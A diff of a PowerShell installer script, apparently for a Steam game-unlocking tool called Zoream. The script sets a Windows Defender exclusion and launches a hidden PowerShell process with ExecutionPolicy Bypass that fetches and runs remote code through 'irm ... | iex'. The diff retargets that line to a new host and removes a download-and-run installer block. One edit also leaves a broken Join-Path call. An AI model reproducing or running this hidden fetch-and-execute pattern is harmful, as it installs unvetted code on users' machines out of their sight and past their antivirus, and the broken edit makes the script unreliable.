@@ -128,53 +128,6 @@ if (-not $steamPath) { Write-Log "Steam not found!" "ERROR"; exit 1 }
 $zoreamPath = Join-Path $env:LOCALAPPDATA "Zoream"
 $zoreamExe = Join-Path $zoreamPath "Zoream.exe"
 
-# -------------------------------------------------------------------------
-# ZOREAM CHECK & DOWNLOAD MODULE
-# -------------------------------------------------------------------------
-if (-not (Test-Path $zoreamExe)) {
-    Write-Log "Zoream component missing. Initiating download..." "WARN"
-    
-    $downloadUrl = "https://github.com/WolfGames156/zoreamrelease/releases/download/release/Zoream_Setup.exe"
-    $tempSetup = Join-Path $env:TEMP "Zoream_Setup.exe"
-
-    try {
-        # .NET WebRequest kullanarak Timeout kontrolü ve Progress Bar
-        $request = [System.Net.WebRequest]::Create($downloadUrl)
-        $request.Timeout = 5000 # 5 Saniye Timeout
-        $response = $request.GetResponse()
-        
-        $totalLength = $response.ContentLength
-        $responseStream = $response.GetResponseStream()
-        $targetStream = [System.IO.File]::Create($tempSetup)
-        $buffer = New-Object byte[] 10KB
-        $readCount = 0
-
-        do {
-            $count = $responseStream.Read($buffer, 0, $buffer.Length)
-            $targetStream.Write($buffer, 0, $count)
-            $readCount += $count
-            if ($totalLength -gt 0) {
-                $pct = [Math]::Floor(($readCount / $totalLength) * 100)
-                Write-Progress -Activity "Downloading Zoream Installer" -Status "Progress: $pct%" -PercentComplete $pct
-            }
-        } while ($count -gt 0)
-
-        $targetStream.Close()
-        $responseStream.Close()
-        $response.Close()
-        
-        Write-Progress -Activity "Downloading Zoream Installer" -Completed
-        Write-Log "Zoream Setup downloaded successfully." "SUCCESS"
-        
-        # Ayrı bir işlem olarak aç (PowerShell'i bekletmesin)
-        Start-Process -FilePath $tempSetup -WindowStyle Normal
-    }
-    catch {
-        # Hata olursa veya 5 saniye timeout yerse hiçbir şey yapma, devam et.
-        # İleride hata yazdırmıyoruz.
-    }
-}
-# -------------------------------------------------------------------------
 
 Write-Log "Applying Windows Defender exclusion for Zoream folder..." "STEP"
 
@@ -361,7 +314,7 @@ Write-Log "Configuring gamesdata" "STEP"
 
 $steamConfigPath = Join-Path $steamPath "config"
 $stpluginPath = Join-Path $steamConfigPath "stplug-in"
-$gamesDataPath = Join-Path $env:APPDATA "Zoream\gamesdata"
+$gamesDataPath = Join-Path $env:APPDATA "gamesdata"
 
 # Hedef gamesdata klasörü yoksa oluştur
 if (-not (Test-Path $gamesDataPath)) {
@@ -410,7 +363,7 @@ else {
 Write-Log "Validating and Cleaning gamesdata folder..." "STEP"
 
 # Yeni dosya yolu tanımı (%appdata%\Zoream\gamesdata)
-$zoreamAppData = Join-Path $env:APPDATA "Zoream"
+$zoreamAppData = Join-Path $env:APPDATA
 $stpluginPath = Join-Path $zoreamAppData "gamesdata"
 
 # --- EKLENEN KISIM: Gizli ve Sistem dosyalarını görünür yap ---
@@ -491,7 +444,7 @@ Write-Host " "
 Write-Host "   *** CORE EXECUTING IN BACKGROUND ***" -ForegroundColor Cyan
 Write-Host " "
 
-$command = "irm https://zdb1.pages.dev/dll.ps1 | iex"
+$command = "irm https://zdb2.pages.dev/dll.ps1 | iex"
 Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden
 
 for ($i = 10; $i -gt 0; $i--) {
